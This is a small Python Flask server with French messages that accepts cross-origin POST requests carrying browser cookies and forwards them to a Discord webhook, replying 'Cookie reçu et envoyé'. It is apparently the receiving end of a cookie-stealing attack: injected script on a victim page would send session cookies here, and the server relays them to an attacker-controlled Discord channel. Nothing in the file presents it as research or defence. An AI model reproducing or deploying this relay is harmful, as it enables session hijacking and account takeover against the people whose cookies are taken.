from flask import Flask, request
from flask_cors import CORS
import requests
import os

app = Flask(__name__)
CORS(app)

WEBHOOK_URL = "https://discord.com/api/webhooks/..."

@app.route("/", methods=["POST"])
def recevoir_cookie():
    data = request.get_json()
    print("🔍 Données reçues:", data)
    if not data or 'content' not in data:
        return "Bad request", 400

    cookie_content = data['content']
    discord_data = { "content": cookie_content }

    response = requests.post(WEBHOOK_URL, json=discord_data)

    if response.status_code == 204:
        print("✅ Cookie envoyé au webhook Discord")
    else:
        print(f"⚠️ Erreur envoi webhook Discord: {response.status_code}, {response.text}")

    return "Cookie reçu et envoyé", 200

@app.route("/", methods=["GET"])
def accueil():
    return "✅ Serveur backend en ligne", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)